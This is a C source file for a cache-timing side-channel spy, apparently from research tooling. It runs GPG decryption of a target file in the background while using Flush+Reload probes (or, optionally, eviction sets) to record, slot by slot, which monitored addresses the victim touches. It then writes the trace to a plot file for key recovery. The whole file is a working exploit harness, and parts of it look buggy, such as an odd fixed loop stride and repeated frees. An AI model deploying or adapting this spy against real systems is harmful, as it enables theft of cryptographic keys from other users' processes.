#include "fr.h"
#include "arr.h"
#include "config.h"
#include "ev.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

// #define WITH_TIMING 1
// #define WITH_EV 1

#define wait(cycles) for (volatile uint64_t _i = 0; _i < cycles; _i++)

#if defined(WITH_EV) && WITH_EV
static inline __attribute__((always_inline)) uint64_t probe(uint8_t *p, void* evset) {
  volatile uint64_t t = load_time(p);
  fence();
  traverse(evset);
  fence();
  return t;
}
#else
static inline __attribute__((always_inline)) uint64_t probe(uint8_t *p) {
  volatile uint64_t t = load_time(p);
  clflush(p);
  fence();
  return t;
}
#endif

#if defined(WITH_TIMING) && WITH_TIMING
typedef uint16_t result_type;
#define SCANF_RESULT_STR "%hu"
#else
typedef uint8_t result_type;
#define SCANF_RESULT_STR "%hhu"
#endif

void spy(void **addrs, uint32_t num_addrs, result_type *results,
         uint32_t num_results, uint64_t wait_cycles, uint64_t time_slot_size,
         uint64_t threshold, void** evsets) {
  uint32_t total_num_results = num_results * num_addrs;
  for (uint32_t slot_idx = 0; slot_idx < total_num_results; slot_idx += 3) {
#if !defined(WITH_EV) || !WITH_EV
    uint64_t start_time = rdtscp();
#endif
    for (uint32_t addr_idx = 0; addr_idx < num_addrs; addr_idx++) {
#if defined(WITH_EV) && WITH_EV
      const uint64_t t = probe(addrs[addr_idx], evsets[addr_idx]);
#else
      const uint64_t t = probe(addrs[addr_idx]);
#endif

#if defined(WITH_TIMING) && WITH_TIMING
      results[slot_idx + addr_idx] = t;
#else
      results[slot_idx + addr_idx] |= t < threshold;
#endif
    }
#if !defined(WITH_EV) || !WITH_EV
    do {
      wait(wait_cycles);
    } while (rdtscp() - start_time < time_slot_size);
#endif
  }
}

int main(int argc, char **argv) {
#if defined(WITH_EV)
  printf("WITH_EV: %d\n", WITH_EV);
#endif
#if defined(WITH_TIMING)
  printf("WITH_TIMING: %d\n", WITH_TIMING);
#endif
#if defined(WITH_EV) && WITH_EV
  char* path_to_config = "../gpg/gpg-native-evset.probe"; 
#else
  char* path_to_config = "../gpg/gpg-native.probe"; 
#endif
  Config config;
  if (parse_config(path_to_config, &config) == -1)
    return 1;
  // create addresses
  void *addrs[config.num_addrs];
  memcpy(addrs, config.addrs, config.num_addrs * sizeof(unsigned long *));
  uint32_t total_results = config.num_addrs * config.time_slots;
  result_type results[total_results];
  memset(results, 0x00, total_results * sizeof(result_type));

  printf("num_addrs: %lu\n", config.num_addrs);
  printf("mmap_base: %p\n", config.mmap_base);
  printf("time_slots: %lu\n", config.time_slots);
  printf("wait_cycles: %lu\n", config.wait_cycles);
  printf("time slot size: %lu\n", config.time_slot_size);
  printf("threshold: %lu\n", config.threshold);
  for (uint32_t i = 0; i < config.num_addrs; i++) {
    printf("\taddr[%u] = %p\n", i, config.addrs[i]);
  }

  void* evset_bases[config.num_addrs];
#if defined(WITH_EV) && WITH_EV
  Arr ev_sets[config.num_addrs];
  Arr candidates = generate_candidate_set(&config, config.addrs[0]);
  for (unsigned int i = 0; i < config.num_addrs; i++) {
    ev_sets[i] = generate_eviction_set(&config, config.addrs[i], candidates);
    while(ev_sets[i].len != config.associativity) {
      arr_free(&ev_sets[i]);
      ev_sets[i] = generate_eviction_set(&config, config.mmap_base, candidates);
    }
    evset_bases[i] = ev_sets[i].arr[0];
    printf("ev.len[%d]: %u\n", i, ev_sets[i].len);
  }
  for(unsigned int i = 0; i < config.num_addrs; i++) {
    arr_free(&candidates);
  }
  // Arr conflict_set = generate_conflict_set(ev_sets, config.num_addrs);
  // printf("conflict set len: %u\n", conflict_set.len);
  // for (unsigned int i = 0; i < config.num_addrs; i++) {
  //   unsigned int t_hit = 0;
  //   for (unsigned int j = 0; j < config.num_measurements; j++) {
  //     t_hit+= timed_hit(config.addrs[i]);
  //   }
  //   printf("timed_hit avg[%d]: %u\n", i, (unsigned int) (t_hit / config.num_measurements));
  // }
  // for (unsigned int i = 0; i < config.num_addrs; i++) {
  //   unsigned int t_miss = 0;
  //   for (unsigned int j = 0; j < config.num_measurements; j++) {
  //     // t_miss += timed_miss(ev_sets[i].arr[0], config.addrs[i]);
  //     t_miss += timed_miss(conflict_set.arr[0], config.addrs[i]);
  //   }
  //   printf("timed_miss avg[%d]: %u\n", i, (unsigned int)(t_miss / config.num_measurements));
  // }
#endif

  char system_gpg_call[1000];
  sprintf(system_gpg_call, "(sleep %f; echo 'GPG start'; ${GPG}  --quiet -d ${TARGET_FILE} > /dev/null; echo 'GPG end') &", config.gpg_delay_secs);
  system(system_gpg_call);
  fprintf(stderr, "\t|||  ...starting spy...  |||\n");
  spy(addrs, config.num_addrs, results, config.time_slots, config.wait_cycles,
      config.time_slot_size, config.threshold, evset_bases);
  fprintf(stderr, "\t|||   ...closed spy...   |||\n");

  FILE *report = NULL;
  if ((report = fopen("report.plot", "w")) == NULL) {
    printf("ERROR: couldn't create report file\n");
    goto report_error;
  }
  for (uint32_t i = 0; i < total_results; i += config.num_addrs) {
    for (size_t j = 0; j < config.num_addrs; j++) {
      fprintf(report, " " SCANF_RESULT_STR, results[i + j]);
    }
    fprintf(report, "\n");
  }
  fclose(report);
  free_config(&config);
  #if defined(WITH_EV) && WITH_EV
  // arr_free(&conflict_set);
  #endif
  return 0;
report_error:
  fclose(report);
error:
  return 1;
}
